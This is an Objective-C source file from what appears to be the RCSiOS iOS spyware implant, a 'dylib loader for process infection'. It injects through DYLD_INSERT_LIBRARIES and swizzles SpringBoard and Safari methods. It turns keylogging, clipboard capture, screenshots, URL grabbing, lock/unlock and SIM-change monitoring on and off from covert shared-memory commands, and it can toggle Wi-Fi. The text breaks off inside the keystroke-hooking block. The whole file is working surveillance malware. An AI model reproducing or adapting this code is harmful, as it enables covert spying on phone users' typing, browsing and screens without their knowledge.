/*
 * RCSiOS - dylib loader for process infection
 *  pon pon 
 *
 * [QUICK TODO]
 * - Cocoa Keylogger
 * - Cocoa Mouse logger
 * - URLGrabber
 *   - Safari
 * - IM (Skype/Nimbuzz/...)
 *   - Text
 *   - Call
 * - MobilePhone
 *
 *
 * Created on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <UIKit/UIApplication.h>
#import <objc/runtime.h>
#import <unistd.h>
#import <dlfcn.h>

#import <fcntl.h>
#import <sys/mman.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSILoader.h"
#import "RCSISharedMemory.h"

#import "RCSIAgentApplication.h"
#import "RCSIAgentInputLogger.h"
#import "RCSIAgentScreenshot.h"
#import "RCSIAgentURL.h"
#import "RCSIAgentPasteboard.h"

#import "ARMHooker.h"

#define CAMERA_APP    @"com.apple.camera"
#define CAMERA_APP_40 @"com.apple.mobileslideshow"

#define VERSION       0.6
#define DEBUG_TMP

#define swizzleMethod(c1, m1, c2, m2) do { \
method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
class_getInstanceMethod(c2, m2)); \
} while(0)


//
// flags which specify if we are hooking the given module
// 0 - Initial State - No Hook
// 1 - Marked for Hooking
// 2 - Hook in place
// 3 - Marked for Unhooking
//
static int urlFlag          = 0;
static int keyboardFlag     = 0;
static int voiceCallFlag    = 0;
static int skypeFlag        = 0;
static int imFlag           = 0;
static int clipboardFlag    = 0;
static int scrFlag          = 0;
static int appFlag          = 0;
static int stdFlag          = 0;
static int simFlag          = 0;

static int gContextHasBeenSwitched = 0;

RCSISharedMemory      *mSharedMemoryCommand = nil;
RCSISharedMemory      *mSharedMemoryLogging = nil;
RCSIKeyLogger         *gLogger;

FILE *mFD;
standByStruct gStandByActions;

BOOL triggerSimChangeAction(UInt32 aAction);

BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
{
  const char *name    = sel_getName(_original);
  const char *newName = sel_getName(_newMethod);
  
#ifdef DEBUG
  NSLog(@"SEL Name: %s", name);
  NSLog(@"SEL newName: %s", newName);
#endif
  
  Method methodOriginal = class_getInstanceMethod(_class, _original);
  
  if (methodOriginal == nil)
    {
#ifdef DEBUG
      NSLog(@"[IAEOR] Message not found [%s %s]\n", class_getName(_class), name);
#endif

      return FALSE;
    }
  
  const char *type  = method_getTypeEncoding(methodOriginal);
  //IMP old           = method_getImplementation(methodOriginal);
  
  if (!class_addMethod (_class, _newMethod, _newImplementation, type))
    {
#ifdef DEBUG
      NSLog(@"Failed to add our new method - probably already exists");
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Method added to target class");
#endif
    }
  
  Method methodNew = class_getInstanceMethod(_class, _newMethod);
  
  if (methodNew == nil)
    {
#ifdef DEBUG
      NSLog(@"[IAEOR] Message not found [%s %s]\n", class_getName(_class), newName);
#endif

      return FALSE;
    }
  
  method_exchangeImplementations(methodOriginal, methodNew);
  
  return TRUE;
}

void RILog (NSString *format, ...)
{
  va_list argList;
  
  va_start (argList, format);
  NSString *string = [[NSString alloc] initWithFormat: format
                                            arguments: argList];
  va_end (argList);
  
#ifdef DEBUG
  mFD = fopen ("/private/var/mobile/RCSIphone/dylib.log", "a");
  fprintf (mFD, "[RCSiOS] - %s\n", [string UTF8String]);
  fclose (mFD);
#endif
  
  [string release];
}

static void TurnWifiOn(CFNotificationCenterRef center, 
                       void *observer,
                       CFStringRef name, 
                       const void *object,
                       CFDictionaryRef userInfo)
{ 
  Class wifiManager = objc_getClass("SBWiFiManager");
  id antani = [wifiManager performSelector: @selector(sharedInstance)];
  [antani setWiFiEnabled: YES];
}

static void TurnWifiOff(CFNotificationCenterRef center, 
                        void *observer,
                        CFStringRef name, 
                        const void *object,
                        CFDictionaryRef userInfo)
{ 
  Class wifiManager = objc_getClass("SBWiFiManager");
  id antani = [wifiManager performSelector: @selector(sharedInstance)];
  [antani setWiFiEnabled: NO];
}

typedef char* (*CTSIMSupportCopyMobileSubscriberIdentity_t)();
typedef NSString* (*CTSIMSupportGetSIMStatus_t)();
NSString* kCTSIMSupportSIMStatusReady = @"kCTSIMSupportSIMStatusReady";
NSString* kCTSIMSupportSIMStatusNotInserted = @"kCTSIMSupportSIMStatusNotInserted";

CTSIMSupportCopyMobileSubscriberIdentity_t __CTSIMSupportCopyMobileSubscriberIdentity;
CTSIMSupportGetSIMStatus_t __CTSIMSupportGetSIMStatus;
#define CT_FRAMEWORK_PUBLIC  "/System/Library/Frameworks/CoreTelephony.framework/CoreTelephony"
#define CT_FRAMEWORK_PRIVATE "/System/Library/PrivateFrameworks/CoreTelephony.framework/CoreTelephony"

@implementation RCSILoader

- (void)simChangeMonitor:(NSNumber*)actionid
{
  BOOL simStatusReady = TRUE;
 
  NSString *simStatus = __CTSIMSupportGetSIMStatus();
  
  if (simStatus != nil && [simStatus compare: kCTSIMSupportSIMStatusReady] == NSOrderedSame)
      simStatusReady = TRUE;
  else
    simStatusReady = FALSE;
      
  while (simFlag == 1) 
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    simStatus = __CTSIMSupportGetSIMStatus();
  
    if (simStatus != nil)
      {      
        if (simStatusReady == FALSE && [simStatus compare: kCTSIMSupportSIMStatusReady] == NSOrderedSame)
          {
#ifdef DEBUG_
            NSLog(@"[DYLIB] %s: sim inserted triggering", __FUNCTION__);
#endif
            simStatusReady = TRUE;
            triggerSimChangeAction([actionid intValue]);
          }
        else if (simStatusReady == TRUE && [simStatus compare: kCTSIMSupportSIMStatusNotInserted] == NSOrderedSame)
          {
#ifdef DEBUG_
            NSLog(@"[DYLIB] %s: sim removed", __FUNCTION__);
#endif
            simStatusReady = FALSE;
          }
      }
  
    [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow:1]];
    
    [pool release];
  }
}

- (void)startSimChangeMonitor:(NSNumber *)actionid
{
  void* base = dlopen(CT_FRAMEWORK_PUBLIC, RTLD_NOW);

  if (base == NULL)
    base = dlopen(CT_FRAMEWORK_PRIVATE, RTLD_NOW);

  if (base == NULL)
      return;
      
  __CTSIMSupportGetSIMStatus = (CTSIMSupportGetSIMStatus_t) dlsym(base, "CTSIMSupportGetSIMStatus");
  __CTSIMSupportCopyMobileSubscriberIdentity = (CTSIMSupportCopyMobileSubscriberIdentity_t) 
                                              dlsym(base, "CTSIMSupportCopyMobileSubscriberIdentity");
                                              
  if (__CTSIMSupportGetSIMStatus == NULL ||
      __CTSIMSupportCopyMobileSubscriberIdentity == NULL)
    return;
    
  [NSThread detachNewThreadSelector: @selector(simChangeMonitor:) toTarget:self withObject: actionid];
}

// For stanby Event
- (BOOL)hookingStandByMethods
{
  // lock class for iOS 3/4
  Class sBUIController = objc_getClass("SBUIController");
  
  // Unlock class for iOS 3/4
  Class sBCallAlertDisplay  = objc_getClass("SBCallAlertDisplay");
  Class sBAwayView          = objc_getClass("SBAwayView");
  Class sBAwayController    = objc_getClass("SBAwayController");
  
  Class classSource = objc_getClass("RCSILoader");
  
  if (sBUIController == nil ||
      sBCallAlertDisplay == nil ||
      sBAwayView == nil)
    return NO;
  
  // Lock method for iOS 3.1.3
  swizzleByAddingIMP(sBUIController, @selector(lock:),
                     class_getMethodImplementation(classSource, @selector(lockHook:)),
                     @selector(lockHook:));
  
  // Lock method for iOS 4.3.3
  swizzleByAddingIMP(sBUIController, @selector(lockWithType:disableLockSound:),
                     class_getMethodImplementation(classSource, @selector(lockWithTypeHook:disableLockSound:)),
                     @selector(lockWithTypeHook:disableLockSound:));
  
  // Unlock method for iOS 4.3.3
  swizzleByAddingIMP(sBAwayController, @selector(unlockWithSound:alertDisplay:),
                     class_getMethodImplementation(classSource, @selector(unlockWithSoundHook:alertDisplay:)),
                     @selector(unlockWithSoundHook:alertDisplay:));
  
  // Unlock methods for iOS 3.1.3
  swizzleByAddingIMP(sBAwayView, @selector(lockBarUnlocked:),
                     class_getMethodImplementation(classSource, @selector(lockBarUnlockedHook:)),
                     @selector(lockBarUnlockedHook:));
  
  swizzleByAddingIMP(sBCallAlertDisplay, @selector(lockBarUnlocked:),
                     class_getMethodImplementation(classSource, @selector(lockBarUnlocked2Hook:)),
                     @selector(lockBarUnlocked2Hook:));
  
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: stdFlag is now %d", __FUNCTION__, stdFlag);
#endif
  
  return YES;
}

#ifdef CORE_DEMO
- (BOOL)hookingForCoreDemo
{
  // lock class for iOS 3/4
  Class sBUIController = objc_getClass("SBUIController");
  
  Class classSource = objc_getClass("RCSILoader");
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: sBUIController 0x%x, classSource 0x%x, init 0x%x, initHook 0x%x", 
        __FUNCTION__, sBUIController, classSource,
        class_getMethodImplementation(sBUIController, @selector(init)),
        class_getMethodImplementation(classSource, @selector(initHook)));
#endif
  
  if (sBUIController == nil)
    return NO;
  
  //iOS 3.1.3
  swizzleByAddingIMP(sBUIController, @selector(init),
                     class_getMethodImplementation(classSource, @selector(initHook)),
                     @selector(initHook));
  
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: hooking done", __FUNCTION__);
#endif
  
  return YES;
}
#endif

- (void)checkForUninstall
{
  BOOL isUninstalled = NO;
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: SB running poll command", __FUNCTION__);
#endif
  
  mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                               size: SHMEM_LOG_MAX_SIZE];
  
  mSharedMemoryCommand = [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
                                                               size: SHMEM_COMMAND_MAX_SIZE];
  
  if ([mSharedMemoryLogging createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while creating the Logging Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand attachToMemoryRegion: NO] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while attaching to the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }

  if ([mSharedMemoryCommand createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while creating the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  while (mMainThreadRunning == YES)
    {
      NSMutableData     *readData = nil;
      shMemoryCommand   *shMemCommand;

      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      // Check for uninstall
      readData = [mSharedMemoryCommand readMemory: OFFT_UNINSTALL
                                    fromComponent: COMP_AGENT]; 
      if (readData != nil)
        {
          NSString *libName, *libWithPathname; 

#ifdef DEBUG
          NSLog(@"[DYLIB] %s: command UNINSTALL", __FUNCTION__);
#endif
          shMemCommand = (shMemoryCommand *)[readData bytes];

          if (shMemCommand->command == AG_UNINSTALL)
            {
              libName = [[NSString alloc] initWithBytes: shMemCommand->commandData 
                                                 length: shMemCommand->commandDataSize 
                                               encoding: NSASCIIStringEncoding];

              libWithPathname = [[NSString alloc] initWithFormat: @"/usr/lib/%@", libName];
              char *dylibStr = getenv("DYLD_INSERT_LIBRARIES");

#ifdef DEBUG
              NSLog(@"[DYLIB] %s: dylib name %@", __FUNCTION__, libWithPathname);
#endif         

              if (dylibStr != NULL)
                {
                  NSString *dylibNSStr = [[NSString alloc] initWithBytes: dylibStr 
                                                                  length: strlen(dylibStr) 
                                                                encoding: NSASCIIStringEncoding];
#ifdef DEBUG
                  NSLog(@"[DYLIB] %s:envs %s", __FUNCTION__, dylibStr);
#endif
                  NSRange dlRange = [dylibNSStr rangeOfString: libWithPathname];

                  if (dlRange.location  != NSNotFound
                      && dlRange.length != 0) 
                    {
                      // check if we're alone
                      if ([dylibNSStr length] == [libWithPathname length])
                        {
#ifdef DEBUG
                          NSLog(@"[DYLIB] %s: dylibNSStr.length %d  dylibPathname length %d", 
                                __FUNCTION__, [dylibNSStr length], [libWithPathname length]);
#endif
                          // Yes we're alone - remove
                          unsetenv("DYLD_INSERT_LIBRARIES");
#ifdef DEBUG
                          dylibStr = getenv("DYLD_INSERT_LIBRARIES");

                          if (dylibStr == NULL) 
                            NSLog(@"[DYLIB] %s: unsetted ", 
                                  __FUNCTION__);
                          else
                            NSLog(@"[DYLIB] %s: unsetted %s", 
                                  __FUNCTION__, dylibStr);
#endif
                        }
                      else 
                        {
                          // delete the colon before or after...
                          if (dlRange.location != 0) 
                            dlRange.location--;

                          // remove the colon too
                          dlRange.length++;
#ifdef DEBUG
                          NSLog(@"%s: delete chars in range %d %d", 
                                __FUNCTION__, dlRange.location, dlRange.length);
#endif        
                          NSMutableString *dylibNSStrOut = [[NSMutableString alloc]
                            initWithString: dylibNSStr];

                          [dylibNSStrOut deleteCharactersInRange: dlRange];

                          setenv("DYLD_INSERT_LIBRARIES",
                                 [dylibNSStrOut UTF8String],
                                 [dylibNSStrOut lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);
#ifdef DEBUG
                          NSLog(@"%s: new val %@", 
                                __FUNCTION__, dylibNSStrOut);
#endif 
                          [dylibNSStrOut release];
                        }
                    }

                  [dylibNSStr release];
                }

              isUninstalled = YES;
              [readData release];
            }
        }

      // Check for events lock/unlock
      readData = [mSharedMemoryCommand readMemory: OFFT_STANDBY
                                    fromComponent: COMP_AGENT];
      if (readData != nil)
        {      

          shMemCommand = (shMemoryCommand *)[readData bytes];

          if (stdFlag == 0 && shMemCommand->command == AG_START)
            {
              memcpy(&gStandByActions, shMemCommand->commandData, sizeof(standByStruct));

#ifdef DEBUG_TMP
              NSLog(@"[DYLIB] %s: start STANDBY swizziling onLock %d, onUnlock %d", 
                    __FUNCTION__, gStandByActions.actionOnLock, gStandByActions.actionOnUnlock);
#endif      
              stdFlag = 1;

              [self hookingStandByMethods];
            }
          else if (stdFlag == 1 && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG_TMP
              NSLog(@"[DYLIB] %s: STANDBY swizziling", __FUNCTION__);
#endif     
              stdFlag = 0;

              gStandByActions.actionOnLock =
                gStandByActions.actionOnUnlock = CONF_ACTION_NULL;

              [self hookingStandByMethods];
            }
        }

    // Check for events sim change
    readData = [mSharedMemoryCommand readMemory: OFFT_SIMCHG
                                  fromComponent: COMP_AGENT];
    if (readData != nil)
      {      
        shMemCommand = (shMemoryCommand *)[readData bytes];
        
        if (simFlag == 0 && shMemCommand->command == AG_START)
          {
#ifdef DEBUG_
            NSLog(@"[DYLIB] %s: startin sim monitor", __FUNCTION__);
#endif
            int simChangeAction = 0xFFFFFFFF;
            memcpy(&simChangeAction, shMemCommand->commandData, sizeof(int));
            NSNumber *act = [[NSNumber alloc] initWithInt: simChangeAction];
            
            simFlag = 1;
          
            [self startSimChangeMonitor: act];
            
            sleep(1);
            
            [act release];
          }
        else if (simFlag == 1 && shMemCommand->command == AG_STOP)
          {   
            simFlag = 0;
          }
      }
      
      [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];

      [innerPool release];

      if (isUninstalled) 
        break;
    }
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: dylib uninstalled exit thread", __FUNCTION__);
#endif
  
  mMainThreadRunning = NO;
  
  [outerPool release];
  
  [NSThread exit];
}

BOOL triggerCamera(UInt32 startStop)
{
  BOOL retVal = YES;
  
  if (mSharedMemoryLogging == nil)
    return FALSE;
    
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = EVENT_CAMERA_APP;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = startStop;
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  if ([mSharedMemoryLogging writeMemory: actionData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: triggering startStop %d", __FUNCTION__, aAction);
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      NSLog(@"[DYLIB] %s: error triggering startStop", __FUNCTION__);
#endif
      retVal=NO;
    }
  
  [actionData release];
  
  [pool release];
  
  return retVal;
}

BOOL triggerSimChangeAction(UInt32 aAction)
{
  BOOL retVal = YES;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = EVENT_SIM_CHANGE;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = aAction;
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  if ([mSharedMemoryLogging writeMemory: actionData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_
    NSLog(@"[DYLIB] %s: triggering action %d", __FUNCTION__, aAction);
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
    NSLog(@"[DYLIB] %s: error triggering action", __FUNCTION__);
#endif
    retVal=NO;
    }
  
  [actionData release];
  
  [pool release];
  
  return retVal;
}

BOOL triggerStanByAction(UInt32 aAction)
{
  BOOL retVal = YES;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = EVENT_STANDBY;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = aAction;
  shMemoryHeader->commandDataSize = 0;
  shMemoryHeader->timestamp       = 0;
  
  if ([mSharedMemoryLogging writeMemory: actionData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: triggering action %d", __FUNCTION__, aAction);
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      NSLog(@"[DYLIB] %s: error triggering action", __FUNCTION__);
#endif
      retVal=NO;
    }
  
  [actionData release];
  
  [pool release];
  
  return retVal;
}

#ifdef CORE_DEMO
- (id)initHook
{
#ifdef DEBUG
  NSLog(@"[DYLIB] %s:  initHook called self 0x%x", __FUNCTION__, self);
#endif
  
  if (self)
    self = [self initHook];
  
  if (self == nil)
    return nil;
  
  UIView *content;
  UIView *window = [self window];

  if ([self contentView])
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: contentView clearColor", __FUNCTION__);
#endif
      content = [self contentView];
      [content setBackgroundColor:[UIColor clearColor]];
    }

#define CORE_DEMO_BGIMAGE @"/Library/Wallpaper/101.jpg"
  
  NSString *path = [[NSString alloc] initWithString: CORE_DEMO_BGIMAGE];
  
  UIImage *image;
  
  if (path != nil) 
    {
      image = [[UIImage alloc] initWithContentsOfFile:path];

      if (image != nil)
        image = [image autorelease];
    }
  else 
    image = nil;
  
  if (image != nil)// && [[window subviews] count]) 
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: insertSubview WallpaperImage_", __FUNCTION__);
      NSArray *sbv = [window subviews];

      if (sbv)
        NSLog(@"[DYLIB] %s: subviews %@", __FUNCTION__, sbv);
#endif
      UIImageView *WallpaperImage_ = [[UIImageView alloc] initWithImage:image];

      [WallpaperImage_ setAlpha: 0.99];
      [window insertSubview:WallpaperImage_ atIndex:0];
    }
  
  return self;
}
#endif

// Hook for stanby events
- (void)lockWithTypeHook:(int)aInteger disableLockSound: (BOOL)aBool
{
  [self lockWithTypeHook:aInteger disableLockSound:aBool];
  
  triggerStanByAction(gStandByActions.actionOnLock);
  
#ifdef DEBUG_TMP
  NSLog(@"[DYLIB] %s:  lockWithTypeHook called", __FUNCTION__);
#endif
}
- (void)lockHook: (BOOL)aValue
{
  [self lockHook: aValue];
  
  triggerStanByAction(gStandByActions.actionOnLock);
  
#ifdef DEBUG_TMP
  NSLog(@"[DYLIB] %s: lockHook called", __FUNCTION__);
#endif
}

- (void)unlockWithSoundHook:(BOOL)aBool alertDisplay:(id)anID
{
  [self unlockWithSoundHook:aBool alertDisplay:anID];
  
  //XXX-
  //triggerStanByAction(gStandByActions.actionOnUnlock);
  
#ifdef DEBUG_TMP
  NSLog(@"[DYLIB] %s:  unlockWithSoundHook called", __FUNCTION__);
#endif
}

- (void)lockBarUnlockedHook:(id)aValue
{
  [self lockBarUnlockedHook: aValue];
  
  triggerStanByAction(gStandByActions.actionOnUnlock);
  
#ifdef DEBUG_TMP
  NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
#endif
}

- (void)lockBarUnlocked2Hook:(id)aValue
{
  [self lockBarUnlocked2Hook: aValue];
  
  triggerStanByAction(gStandByActions.actionOnUnlock);
  
#ifdef DEBUG_TMP
  NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
#endif
}

- (BOOL)startScreenshotAgent
{
  RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
  
  if ([scrAgent testAndSetIsAlreadyRunning] == TRUE)
    {
      [NSThread detachNewThreadSelector: @selector(start)
                               toTarget: scrAgent
                             withObject: nil];

      NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)]; 
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = AGENT_SCREENSHOT;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      shMemoryHeader->commandDataSize = 0;
      
      if ([mSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_SCREENSHOT
                              fromComponent: COMP_CORE])
        return TRUE;
      else
        return FALSE;                     
    }
    
  return TRUE;
}

- (void)communicateWithCore
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
  //
  // Here we need to start the loop for checking and reading any configuration
  // change made on the shared memory
  //
  
  //int agentsCount = 8;
  //int agentIndex = 0;
  //
  // Initialize and attach to our Shared Memory regions
  //
  mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                               size: SHMEM_LOG_MAX_SIZE];
  
  mSharedMemoryCommand = [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
                                                               size: SHMEM_COMMAND_MAX_SIZE];
  
  if ([mSharedMemoryLogging createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG_TMP
      NSLog (@"[DYLIB] %s: There was an error while creating the Logging Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand attachToMemoryRegion: NO] == -1)
    {
#ifdef DEBUG_TMP
      NSLog (@"[DYLIB] %s: There was an error while attaching to the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG_TMP
      NSLog (@"[DYLIB] %s: There was an error while creating the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: execName %@ triggering sem", __FUNCTION__, execName);
#endif
      triggerCamera(1);
    }
    
  while (mMainThreadRunning == YES)
    {
      NSMutableData     *readData = nil;
      shMemoryCommand   *shMemCommand;

      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      if ([mSharedMemoryCommand isShMemValid] == NO ||
          [mSharedMemoryLogging isShMemValid] == NO)
        {
#ifdef DEBUG
          NSLog(@"%s: shared memory is invalid!", __FUNCTION__);
#endif
          if ([mSharedMemoryCommand restartShMem] == NO)
            {
#ifdef DEBUG
              NSLog(@"%s: fatal error on restart command shared mem", __FUNCTION__);
#endif
            }
          if ([mSharedMemoryLogging restartShMem] == NO)
            {
#ifdef DEBUG
              NSLog(@"%s: fatal error on restart log shared mem", __FUNCTION__);
#endif
            }
        }

      // Silly Code but it's faster than a switch/case inside a loop
      readData = [mSharedMemoryCommand readMemory: OFFT_SCREENSHOT
                                    fromComponent: COMP_AGENT];
                                    
      if (readData != nil)
        {
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (shMemCommand->agentID == AGENT_SCREENSHOT &&
              shMemCommand->command == AG_START)
            {
              [self startScreenshotAgent];
            }
            
          [readData release];
        }

      readData = [mSharedMemoryCommand readMemory: OFFT_URL
                                    fromComponent: COMP_AGENT];

      if (readData != nil)
        {
#ifdef DEBUG_VERBOSE_1
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif

          shMemCommand = (shMemoryCommand *)[readData bytes];

          if (urlFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Starting Agent URL", __FUNCTION__);
#endif

              urlFlag = 1;
            }
          else if ((urlFlag == 1 || urlFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Stopping Agent URL", __FUNCTION__);
#endif

              urlFlag = 3;
            }

          [readData release];
        }

      readData = [mSharedMemoryCommand readMemory: OFFT_APPLICATION
                                    fromComponent: COMP_AGENT];

      if (readData != nil)
        {
#ifdef DEBUG_VERBOSE_1
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif

          shMemCommand = (shMemoryCommand *)[readData bytes];

          if (appFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
#endif

              appFlag = 1;
            }
          else if ((appFlag == 1 || appFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
#endif

              appFlag = 3;
            }

          [readData release];
        }

      readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
                                    fromComponent: COMP_AGENT];

      if (readData != nil)
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif

          shMemCommand = (shMemoryCommand *)[readData bytes];

          if (keyboardFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG_TMP
              NSLog(@"[DYLIB] %s: Starting Agent Keylog", __FUNCTION__);
#endif

              keyboardFlag = 1;
            }
          else if ((keyboardFlag == 1 || keyboardFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG_TMP
              NSLog(@"[DYLIB] %s: Stopping Agent Keylog", __FUNCTION__);
#endif

              keyboardFlag = 3;
            }

          [readData release];
        }

      readData = [mSharedMemoryCommand readMemory: OFFT_CLIPBOARD
                                    fromComponent: COMP_AGENT];

      if (readData != nil)
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif

          shMemCommand = (shMemoryCommand *)[readData bytes];

          if (clipboardFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Starting Agent clipboard", __FUNCTION__);
#endif

              clipboardFlag = 1;
            }
          else if ((clipboardFlag == 1 || clipboardFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Stopping Agent clipboard", __FUNCTION__);
#endif

              clipboardFlag = 3;
            }

          [readData release];
        }

      if (urlFlag == 1)
        {
          urlFlag = 2;

#ifdef DEBUG
          NSLog(@"Hooking URLs");
#endif

          Class className   = objc_getClass("TabController");
          Class classSource = objc_getClass("myTabController");

          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(tabDocumentDidUpdateURL:),
                                  class_getMethodImplementation(classSource, @selector(tabDocumentDidUpdateURLHook:)),
                                  @selector(tabDocumentDidUpdateURLHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        }
      else if (urlFlag == 3)
        {
          urlFlag = 0;

#ifdef DEBUG
          NSLog(@"Unhooking URLs");
#endif

          Class className = objc_getClass("TabController");

          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(tabDocumentDidUpdateURL:),
                                  class_getMethodImplementation(className, @selector(tabDocumentDidUpdateURLHook:)),
                                  @selector(tabDocumentDidUpdateURLHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        }

      if (appFlag == 1)
        {
          appFlag = 2;

          RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];

          [appAgent start];

#ifdef DEBUG
          NSLog(@"Hooking Application");
#endif

        }
      else if (appFlag == 3)
        {
          appFlag = 0;
          RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];

          [appAgent stop];

#ifdef DEBUG
          NSLog(@"Stopping Application");
#endif

        }

      if (keyboardFlag == 1)
        {
          keyboardFlag = 2;

#ifdef DEBUG_TMP
          NSLog(@"Hooking Keystrokes");
#endif

          Class className   = objc_getClass("UINavigationItem");
